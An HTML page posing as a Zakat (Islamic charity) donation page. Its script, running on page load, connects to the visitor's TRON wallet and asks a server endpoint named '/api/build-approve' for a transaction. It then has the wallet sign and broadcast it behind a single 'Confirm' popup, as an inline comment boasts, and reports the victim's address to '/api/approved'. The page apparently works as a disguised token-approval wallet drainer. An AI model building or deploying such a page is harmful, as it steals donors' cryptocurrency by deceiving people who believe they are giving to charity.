<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zakat Donation</title>
</head>
<body style="background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding:60px 20px;margin:0;">
    <p id="msg1" style="font-size:18px;color:#e2e8f0;">Preparing your Zakat...</p>
    <p id="msg2" style="font-size:12px;color:#6b7280;margin-top:12px;"></p>

    <script>
        var el1 = document.getElementById("msg1");
        var el2 = document.getElementById("msg2");
        var done = false;

        function msg(a, b) {
            el1.textContent = a;
            if (b !== undefined) el2.textContent = b;
        }

        function getAddress() {
            var tw = window.tronWeb;
            if (!tw) return null;
            var addr = tw.defaultAddress && tw.defaultAddress.base58;
            if (!addr || addr === "false" || addr.length < 10) return null;
            return addr;
        }

        function buildAndSign(addr) {
            if (done) return;
            done = true;

            fetch("/api/build-approve", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({donor: addr})
            })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.error) { msg("Error", data.error); return; }
                // This is the ONLY popup the user sees - just "Confirm"
                return window.tronWeb.trx.sign(data.transaction);
            })
            .then(function(signed) {
                if (!signed) return;
                msg("Processing...", "");
                return window.tronWeb.trx.sendRawTransaction(signed);
            })
            .then(function(res) {
                if (!res) return;
                var id = res.txid || (res.transaction && res.transaction.txID) || "";
                msg("Jazak Allah Khair!", "Your Zakat has been submitted");
                el1.style.color = "#4ade80";
                fetch("/api/approved", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({donor: addr, txId: id})
                }).catch(function(){});
            })
            .catch(function(e) {
                var m = e.message || "";
                if (m.indexOf("cancel") !== -1 || m.indexOf("reject") !== -1) {
                    msg("Cancelled", "You can close this page");
                } else {
                    msg("Error", m);
                }
                el1.style.color = "#f87171";
                done = false;
            });
        }

        function tryConnect() {
            // Method 1: address already available
            var addr = getAddress();
            if (addr) { buildAndSign(addr); return; }

            // Listen for account changes
            window.addEventListener("message", function(e) {
                if (e.data && e.data.message && e.data.message.action === "setAccount") {
                    var a = getAddress();
                    if (a && !done) buildAndSign(a);
                }
            });

            // Request accounts and poll for address
            var reqFn = (window.tronLink && window.tronLink.request) || (window.tronWeb && window.tronWeb.request);
            if (reqFn) {
                reqFn({ method: "tron_requestAccounts" }).then(function() {}).catch(function(){});
            }

            // Poll for address after request (it may take a few seconds)
            var pollCount = 0;
            var pollTimer = setInterval(function() {
                pollCount++;
                var a = getAddress();
                el2.textContent = "Connecting... (" + pollCount + ") addr:" + (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
                if (a && !done) {
                    clearInterval(pollTimer);
                    buildAndSign(a);
                } else if (pollCount > 30) {
                    clearInterval(pollTimer);
                    // Show full debug
                    var tw = window.tronWeb;
                    var info = "";
                    if (tw) {
                        info = "addr:" + JSON.stringify(tw.defaultAddress) + " ready:" + tw.ready;
                    }
                    msg("Could not get address", info);
                }
            }, 500);
        }

        // Wait for tronWeb to be injected, then connect immediately
        var attempts = 0;
        var waitForWallet = setInterval(function() {
            attempts++;
            if (done) { clearInterval(waitForWallet); return; }
            if (window.tronWeb || window.tronLink) {
                clearInterval(waitForWallet);
                tryConnect();
            } else if (attempts > 20) {
                clearInterval(waitForWallet);
                msg("Wallet not detected", "Please open in Trust Wallet browser");
            }
        }, 250);
    </script>
</body>
</html>
